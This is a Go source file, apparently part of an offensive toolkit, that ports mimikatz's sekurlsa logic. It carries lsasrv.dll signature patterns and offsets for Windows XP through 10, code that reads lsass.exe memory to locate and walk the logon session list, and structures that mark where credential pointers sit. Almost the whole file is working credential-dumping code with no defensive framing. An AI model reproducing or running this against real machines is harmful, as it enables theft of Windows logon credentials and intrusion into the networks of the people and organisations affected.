package kiwi

import (
	"bytes"
	"fmt"
	"strings"
	"time"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/convert"
	"project/internal/logger"
	"project/internal/module/windows/api"
)

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c

var (
	patternWin5xX64LogonSessionList = []byte{
		0x4C, 0x8B, 0xDF, 0x49, 0xC1, 0xE3, 0x04, 0x48, 0x8B, 0xCB, 0x4C, 0x03, 0xD8,
	}
	patternWin60X64LogonSessionList = []byte{
		0x33, 0xFF, 0x45, 0x85, 0xC0, 0x41, 0x89, 0x75, 0x00, 0x4C, 0x8B, 0xE3, 0x0F, 0x84,
	}
	patternWin61X64LogonSessionList = []byte{
		0x33, 0xF6, 0x45, 0x89, 0x2F, 0x4C, 0x8B, 0xF3, 0x85, 0xFF, 0x0F, 0x84,
	}
	patternWin63X64LogonSessionList = []byte{
		0x8B, 0xDE, 0x48, 0x8D, 0x0C, 0x5B, 0x48, 0xC1, 0xE1, 0x05, 0x48, 0x8D, 0x05,
	}
	patternWin6xX64LogonSessionList = []byte{
		0x33, 0xFF, 0x41, 0x89, 0x37, 0x4C, 0x8B, 0xF3, 0x45, 0x85, 0xC0, 0x74,
	}
	patternWin1703X64LogonSessionList = []byte{
		0x33, 0xFF, 0x45, 0x89, 0x37, 0x48, 0x8B, 0xF3, 0x45, 0x85, 0xC9, 0x74,
	}
	patternWin1803X64LogonSessionList = []byte{
		0x33, 0xFF, 0x45, 0x89, 0x37, 0x48, 0x8B, 0xF3, 0x45, 0x85, 0xC9, 0x74,
	}
	// key = build version
	lsaSrvReferencesX64 = map[uint32]*patchGeneric{
		buildWinXP: {
			search: &patchPattern{
				length: len(patternWin5xX64LogonSessionList),
				data:   patternWin5xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 0},
		},
		buildWin2003: {
			search: &patchPattern{
				length: len(patternWin5xX64LogonSessionList),
				data:   patternWin5xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: -45},
		},
		buildWinVista: {
			search: &patchPattern{
				length: len(patternWin60X64LogonSessionList),
				data:   patternWin60X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 21, off1: -4},
		},
		buildWin7: {
			search: &patchPattern{
				length: len(patternWin61X64LogonSessionList),
				data:   patternWin61X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 19, off1: -4},
		},
		buildWin8: {
			search: &patchPattern{
				length: len(patternWin6xX64LogonSessionList),
				data:   patternWin6xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 16, off1: -4},
		},
		buildWinBlue: {
			search: &patchPattern{
				length: len(patternWin63X64LogonSessionList),
				data:   patternWin63X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 36, off1: -6},
		},
		buildWin10v1507: {
			search: &patchPattern{
				length: len(patternWin6xX64LogonSessionList),
				data:   patternWin6xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 16, off1: -4},
		},
		buildWin10v1703: {
			search: &patchPattern{
				length: len(patternWin1703X64LogonSessionList),
				data:   patternWin1703X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 23, off1: -4},
		},
		buildWin10v1803: {
			search: &patchPattern{
				length: len(patternWin1803X64LogonSessionList),
				data:   patternWin1803X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 23, off1: -4},
		},
		buildWin10v1903: {
			search: &patchPattern{
				length: len(patternWin6xX64LogonSessionList),
				data:   patternWin6xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 23, off1: -4},
		},
	}
)

var (
	patternWin5xX86LogonSessionList = []byte{
		0xFF, 0x50, 0x10, 0x85, 0xC0, 0x0F, 0x84,
	}
	patternWin7X86LogonSessionList = []byte{
		0x89, 0x71, 0x04, 0x89, 0x30, 0x8D, 0x04, 0xBD,
	}
	patternWin80X86LogonSessionList = []byte{
		0x8B, 0x45, 0xF8, 0x8B, 0x55, 0x08, 0x8B, 0xDE, 0x89, 0x02, 0x89, 0x5D, 0xF0, 0x85, 0xC9, 0x74,
	}
	patternWin81X86LogonSessionList = []byte{
		0x8B, 0x4D, 0xE4, 0x8B, 0x45, 0xF4, 0x89, 0x75, 0xE8, 0x89, 0x01, 0x85, 0xFF, 0x74,
	}
	patternWin6xX86LogonSessionList = []byte{
		0x8B, 0x4D, 0xE8, 0x8B, 0x45, 0xF4, 0x89, 0x75, 0xEC, 0x89, 0x01, 0x85, 0xFF, 0x74,
	}
	// key = build version
	lsaSrvReferencesX86 = map[uint32]*patchGeneric{
		buildWinXP: {
			search: &patchPattern{
				length: len(patternWin5xX86LogonSessionList),
				data:   patternWin5xX86LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 24, off1: 0},
		},
		buildWin2003: {
			search: &patchPattern{
				length: len(patternWin7X86LogonSessionList),
				data:   patternWin7X86LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -11, off1: -43},
		},
		buildWinVista: {
			search: &patchPattern{
				length: len(patternWin7X86LogonSessionList),
				data:   patternWin7X86LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -11, off1: -42},
		},
		buildWin8: {
			search: &patchPattern{
				length: len(patternWin80X86LogonSessionList),
				data:   patternWin80X86LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 18, off1: -4},
		},
		buildWinBlue: {
			search: &patchPattern{
				length: len(patternWin81X86LogonSessionList),
				data:   patternWin81X86LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 16, off1: -4},
		},
		buildWin10v1507: {
			search: &patchPattern{
				length: len(patternWin6xX86LogonSessionList),
				data:   patternWin6xX86LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 16, off1: -4},
		},
	}
)

func (kiwi *Kiwi) searchLogonSessionListAddress(pHandle windows.Handle, patch *patchGeneric) error {
	lsasrv, err := kiwi.getLSASSBasicModuleInfo(pHandle, "lsasrv.dll")
	if err != nil {
		return err
	}
	// read lsasrv.dll memory
	memory := make([]byte, lsasrv.size)
	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], uintptr(lsasrv.size))
	if err != nil {
		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
	}
	// search logon session list pattern
	index := bytes.Index(memory, patch.search.data)
	if index == -1 {
		return errors.WithMessage(err, "failed to search logon session list reference pattern")
	}
	// read logon session list address
	address := lsasrv.address + uintptr(index+patch.offsets.off0)
	var offset int32
	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
	if err != nil {
		return errors.WithMessage(err, "failed to read offset about logon session list address")
	}
	logonSessionListAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
	kiwi.logf(logger.Debug, "logon session list address is 0x%X", logonSessionListAddr)
	// read logon session list count
	address = lsasrv.address + uintptr(index+patch.offsets.off1)
	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
	if err != nil {
		return errors.WithMessage(err, "failed to read offset about logon session list count")
	}
	logonSessionListCountAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
	kiwi.logf(logger.Debug, "logon session list count address is 0x%X", logonSessionListCountAddr)
	kiwi.logonSessionListAddr = logonSessionListAddr
	kiwi.logonSessionListCountAddr = logonSessionListCountAddr
	return nil
}

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.h

type msv10List62 struct {
	fLink         uintptr // point to msv10List62
	bLink         uintptr // point to msv10List62
	unknown0      uintptr
	unknown1      uint32
	unknown2      uintptr
	unknown3      uint32
	unknown4      uint32
	unknown5      uint32
	hSemaphore6   uintptr
	unknown7      uintptr
	hSemaphore8   uintptr
	unknown9      uintptr
	unknown10     uintptr
	unknown11     uint32
	unknown12     uint32
	unknown13     uintptr
	logonID       windows.LUID
	luid1         windows.LUID
	username      api.LSAUnicodeString
	domainName    api.LSAUnicodeString
	unknown14     uintptr
	unknown15     uintptr
	typ           api.LSAUnicodeString
	sid           uintptr
	logonType     uint32
	unknown18     uintptr
	session       uint32
	logonTime     int64
	logonServer   api.LSAUnicodeString
	credentials   uintptr
	unknown19     uintptr
	unknown20     uintptr
	unknown21     uintptr
	unknown22     uint32
	unknown23     uint32
	unknown24     uint32
	unknown25     uint32
	unknown26     uint32
	unknown27     uintptr
	unknown28     uintptr
	unknown29     uintptr
	credentialMgr uintptr
}

type msv10List63 struct {
	fLink         uintptr // point to msv10List63
	bLink         uintptr // point to msv10List63
	unknown0      uintptr
	unknown1      uint32
	unknown2      uintptr
	unknown3      uint32
	unknown4      uint32
	unknown5      uint32
	hSemaphore6   uintptr
	unknown7      uintptr
	hSemaphore8   uintptr
	unknown9      uintptr
	unknown10     uintptr
	unknown11     uint32
	unknown12     uint32
	unknown13     uintptr
	logonID       windows.LUID
	luid1         windows.LUID
	waZa          [12]byte
	username      api.LSAUnicodeString
	domainName    api.LSAUnicodeString
	unknown14     uintptr
	unknown15     uintptr
	typ           api.LSAUnicodeString
	sid           uintptr
	logonType     uint32
	unknown18     uintptr
	session       uint32
	logonTime     int64
	logonServer   api.LSAUnicodeString
	credentials   uintptr
	unknown19     uintptr
	unknown20     uintptr
	unknown21     uintptr
	unknown22     uint32
	unknown23     uint32
	unknown24     uint32
	unknown25     uint32
	unknown26     uint32
	unknown27     uintptr
	unknown28     uintptr
	unknown29     uintptr
	credentialMgr uintptr
}

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c

type lsaEnum struct {
	size                  uintptr
	offsetToLogonID       uint32
	offsetToLogonType     uint32
	offsetToSession       uint32
	offsetToUsername      uint32
	offsetToDomainName    uint32
	offsetToCredentials   uint32
	offsetToSID           uint32
	offsetToCredentialMgr uint32
	offsetToLogonTime     uint32
	offsetToLogonServer   uint32
}

var (
	msv10List62Struct = msv10List62{}
	msv10List63Struct = msv10List63{}
	// key = minimum windows build
	lsaEnums = map[uint32]*lsaEnum{
		buildMinWinBlue: {
			size:                  unsafe.Sizeof(msv10List62Struct),
			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List62Struct.logonID)),
			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List62Struct.logonType)),
			offsetToSession:       uint32(unsafe.Offsetof(msv10List62Struct.session)),
			offsetToUsername:      uint32(unsafe.Offsetof(msv10List62Struct.username)),
			offsetToDomainName:    uint32(unsafe.Offsetof(msv10List62Struct.domainName)),
			offsetToCredentials:   uint32(unsafe.Offsetof(msv10List62Struct.credentials)),
			offsetToSID:           uint32(unsafe.Offsetof(msv10List62Struct.sid)),
			offsetToCredentialMgr: uint32(unsafe.Offsetof(msv10List62Struct.credentialMgr)),
			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List62Struct.logonTime)),
			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List62Struct.logonServer)),
		},
		buildMinWin10: {
			size:                  unsafe.Sizeof(msv10List63Struct),
			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List63Struct.logonID)),
			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List63Struct.logonType)),
			offsetToSession:       uint32(unsafe.Offsetof(msv10List63Struct.session)),
			offsetToUsername:      uint32(unsafe.Offsetof(msv10List63Struct.username)),
			offsetToDomainName:    uint32(unsafe.Offsetof(msv10List63Struct.domainName)),
			offsetToCredentials:   uint32(unsafe.Offsetof(msv10List63Struct.credentials)),
			offsetToSID:           uint32(unsafe.Offsetof(msv10List63Struct.sid)),
			offsetToCredentialMgr: uint32(unsafe.Offsetof(msv10List63Struct.credentialMgr)),
			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List63Struct.logonTime)),
			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List63Struct.logonServer)),
		},
	}
)

// LogonSession contains information about session.
type LogonSession struct {
	LogonID     windows.LUID
	Session     uint32
	Domain      string
	Username    string
	LogonServer string
	LogonTime   time.Time
	SID         string
	Credentials []*Credential
}

func (kiwi *Kiwi) getLogonSessionList(pHandle windows.Handle, patch *patchGeneric) ([]*LogonSession, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.logonSessionListAddr == 0 {
		err := kiwi.searchLogonSessionListAddress(pHandle, patch)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to search logon session list address")
		}
	}
	address := kiwi.logonSessionListCountAddr
	// get session list count
	var count uint32
	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), unsafe.Sizeof(count))
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read logon session list count")
	}
	kiwi.log(logger.Debug, "logon session list count is", count)

	// var retCallback bool

	enum := lsaEnums[buildMinWin10]

	// get session list
	var sessions []*LogonSession
	const listEntrySize = 2 * unsafe.Sizeof(uintptr(0))
	listAddr := kiwi.logonSessionListAddr - listEntrySize
	for i := uint32(0); i < count; i++ {
		listAddr += listEntrySize
		// read logon session data address
		var addr uintptr
		_, err = api.ReadProcessMemory(pHandle, listAddr, (*byte)(unsafe.Pointer(&addr)), unsafe.Sizeof(addr))
		if err != nil {
			return nil, errors.WithMessage(err, "failed to read logon session data address")
		}
		for {
			if addr == listAddr {
				break
			}
			// read logon session data
			buf := make([]byte, enum.size)
			_, err = api.ReadProcessMemory(pHandle, addr, &buf[0], enum.size)
			if err != nil {
				return nil, errors.WithMessage(err, "failed to read logon session data")
			}
			domainNameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToDomainName]))
			domainName, err := api.ReadLSAUnicodeString(pHandle, domainNameLus)
			if err != nil {
				return nil, err
			}
			usernameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToUsername]))
			username, err := api.ReadLSAUnicodeString(pHandle, usernameLus)
			if err != nil {
				return nil, err
			}
			logonServerLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToLogonServer]))
			logonServer, err := api.ReadLSAUnicodeString(pHandle, logonServerLus)
			if err != nil {
				return nil, err
			}
			sid, err := readSIDFromLsass(pHandle, *(*uintptr)(unsafe.Pointer(&buf[enum.offsetToSID])))
			if err != nil {
				kiwi.log(logger.Debug, "failed to read SID from lsass.exe:", err)
			}
			logonID := *(*windows.LUID)(unsafe.Pointer(&buf[enum.offsetToLogonID]))
			session := LogonSession{
				LogonID:     logonID,
				Domain:      domainName,
				Username:    username,
				LogonServer: logonServer,
				SID:         sid,
			}
			sessions = append(sessions, &session)
			addr = *(*uintptr)(unsafe.Pointer(&buf[0]))
		}
	}
	return sessions, nil
}

func readSIDFromLsass(pHandle windows.Handle, address uintptr) (string, error) {
	var n byte
	_, err := api.ReadProcessMemory(pHandle, address+1, &n, 1)
	if err != nil {
		return "", errors.WithMessage(err, "failed to read number about SID")
	}
	// version + number + SID identifier authority + value
	size := uintptr(1 + 1 + 6 + 4*n)
	buf := make([]byte, size)
	_, err = api.ReadProcessMemory(pHandle, address, &buf[0], size)
	if err != nil {
		return "", errors.WithMessage(err, "failed to read SID")
	}
	// identifier authority
	ia := convert.BEBytesToUint32(buf[4:8])
	format := "S-%d-%d" + strings.Repeat("-%d", int(n))
	// format SID
	v := []interface{}{buf[0], ia}
	for i := 8; i < len(buf); i += 4 {
		v = append(v, convert.LEBytesToUint32(buf[i:i+4]))
	}
	return fmt.Sprintf(format, v...), nil
}
